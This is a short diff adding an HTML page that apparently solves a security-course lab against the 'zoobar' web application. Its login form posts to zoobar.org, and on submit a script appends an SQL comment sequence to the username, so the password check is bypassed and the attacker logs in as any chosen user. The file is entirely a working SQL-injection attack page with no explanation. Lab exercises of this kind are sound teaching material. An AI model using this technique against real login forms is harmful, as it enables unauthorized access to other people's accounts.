@@ -1,0 +1,13 @@
+<html>
+	<form method="POST" name="loginform" onsubmit="sql()"  action="http://zoobar.org/index.php">
+		<input id="username" type="text" name="login_username" size=25 autocomplete=no />
+		<input type=hidden name=login_password value="YouWontGuessThisOne" />
+		<input type="submit" name="submit_registration" value="Login"/>
+	</form>
+	<script>
+		function sql() {
+			document.getElementById('username').value += "'--";
+			return true;
+		}
+	</script>
+</html>
